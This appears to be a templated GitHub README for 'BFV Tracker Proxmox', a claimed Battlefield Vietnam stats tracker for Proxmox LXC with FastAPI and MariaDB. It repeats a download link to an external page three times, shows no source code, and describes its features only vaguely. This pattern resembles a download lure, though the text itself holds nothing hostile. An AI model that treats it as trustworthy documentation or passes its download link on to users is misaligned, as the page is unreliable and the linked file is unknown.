# BFV Tracker Proxmox v1.0 - Game Script Utility 2026

> Battlefield Vietnam stat tracking for Debian and Ubuntu Proxmox LXC containers, featuring a web UI, FastAPI API access, and live server monitoring.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Debian/Ubuntu%20Proxmox%20LXC-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/fisherdaniel24/bfv-stats-tracker-proxmox?style=flat-square)](https://github.com/fisherdaniel24/bfv-stats-tracker-proxmox)

---

<p align="center">
  <a href="https://fisherdaniel24.github.io/bfv-stats-tracker-proxmox/">
    <img src="https://img.shields.io/badge/Download-BFV%20Tracker%20Proxmox-brightgreen?style=for-the-badge" alt="Download BFV Tracker Proxmox">
  </a>
</p>

> **[Direct Download - BFV Tracker Proxmox](https://fisherdaniel24.github.io/bfv-stats-tracker-proxmox/)**

---

[Download Latest Build](https://fisherdaniel24.github.io/bfv-stats-tracker-proxmox/)

---

## Project Overview

BFV Tracker Proxmox is built for Battlefield Vietnam statistics tracking inside Debian and Ubuntu Proxmox LXC environments. It brings together a browser-based dashboard and backend services so admins can inspect server activity, player stats, and log-based records from a single interface.

At its core, the project combines ongoing server monitoring with structured data storage. FastAPI provides API access, MariaDB handles persistent records, and an automated installer helps reduce deployment effort. An admin panel is included for controlling tracked data and application settings.

## Core Features

- Automated installer for faster Proxmox LXC deployment
- Live server monitoring for match and activity observation
- Web UI for stats review and administrative actions
- FastAPI REST API for programmatic integration
- MariaDB-backed storage for server and player records
- Log parser with deduplication to limit repeated entries
- Dark and light themes for interface preference
- Admin panel for tracker operations and data management

## Installation

1. Download the latest build from the link above.
2. Copy the project files into the Proxmox LXC container or deployment directory you want to use.
3. Run the installer from a Debian or Ubuntu environment that provides the required services.
4. Complete the prompts to set up the database, API, and web interface.

Typical install sequence:
- Install dependencies
- Initialize MariaDB
- Start the FastAPI service
- Open the web UI in your browser

## Configuration

Common settings for BFV Tracker Proxmox:

| Option | Purpose |
| --- | --- |
| `theme` | Choose dark or light interface styling |
| `database` | Set MariaDB connection details |
| `api_enabled` | Turn REST API access on or off |
| `monitoring_interval` | Adjust how often live checks run |
| `log_path` | Point the parser to your server logs |
| `admin_panel` | Enable or restrict administrative access |

Minimal example:
- `theme=dark`
- `api_enabled=true`
- `monitoring_interval=30`

## Compatibility

BFV Tracker Proxmox is meant for Debian and Ubuntu Proxmox LXC containers. Its design focuses on Battlefield Vietnam statistics tracking, including server monitoring and log handling.

Notes:
- Best suited to Proxmox LXC deployments
- Requires a working MariaDB instance
- Depends on FastAPI-compatible hosting
- Exact behavior may vary based on log format and container setup
- Features tied to Battlefield Vietnam data sources depend on the available server logs

## FAQ

### How is it installed?
Run the automated installer after extracting the project into your Proxmox LXC environment. It is intended to walk you through database and service setup.

### Can I upgrade an existing install?
Yes. Swap in the newer project files, then rerun the installer or any other setup steps required by your environment.

### Is an API included?
Yes. BFV Tracker Proxmox exposes a FastAPI REST API for retrieving statistics and related server data.

### Can the interface be changed?
Yes. Dark and light themes are included, and additional settings can be adjusted through configuration.

### Where does the tracker keep its data?
Tracked data is stored in MariaDB so server and player statistics remain available after restarts.

### Does it work across multiple container setups?
It is intended for Debian and Ubuntu Proxmox LXC deployments, though actual compatibility still depends on your container resources and configuration.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
